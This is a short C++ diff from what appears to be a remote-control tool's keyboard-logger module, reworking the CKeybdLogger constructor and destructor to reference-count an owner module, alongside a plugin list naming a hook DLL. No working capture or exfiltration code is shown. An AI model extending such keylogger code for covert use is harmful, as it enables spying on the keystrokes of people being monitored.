@@ -31,16 +31,21 @@ TCHAR* plugs[] = {
 	TEXT("hookdll_x64.dll"),
 };
 
-CKeybdLogger::~CKeybdLogger()
-{
 
-}
-
-CKeybdLogger::CKeybdLogger(CClient *pClient) :
+CKeybdLogger::CKeybdLogger(CClient *pClient, Module * owner) :
 CEventHandler(pClient, KBLG)
 {
-	
+	m_owner = owner;
+	if (m_owner)
+		get_module(m_owner);
 }
+
+CKeybdLogger::~CKeybdLogger()
+{
+	if (m_owner)
+		put_module(m_owner);
+}
+
 
 void CKeybdLogger::Lock()
 {
